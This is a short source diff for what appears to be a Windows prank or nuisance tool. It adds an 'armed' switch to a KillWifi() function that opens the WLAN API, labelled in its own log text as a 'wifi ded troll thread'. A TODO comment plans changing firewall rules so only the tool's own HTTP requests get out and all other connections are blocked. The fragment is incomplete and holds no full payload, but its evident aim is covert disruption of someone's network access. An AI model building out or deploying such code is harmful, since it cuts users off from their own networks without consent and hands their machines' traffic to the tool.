@@ -1,5 +1,11 @@
 #include "network.h"
 
+extern bool armed;
+
+/* TODO: Change this to maybe modify firewall rules in order to only allow our HTTP requests out of it
+ * and block all other connections. Maybe create a new firewall profile set???
+ */
+
 int KillWifi() {
 	// Declare and initialize variables.
 
@@ -9,6 +15,9 @@ int KillWifi() {
 	DWORD dwResult = 0;
 
 	WCHAR GuidString[40] = { 0 };
+
+	if (!armed) printf("Beginning wifi ded troll thread\n");
+	if (!armed) return 0;
 
 	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient); //  
 	if (dwResult != ERROR_SUCCESS) {
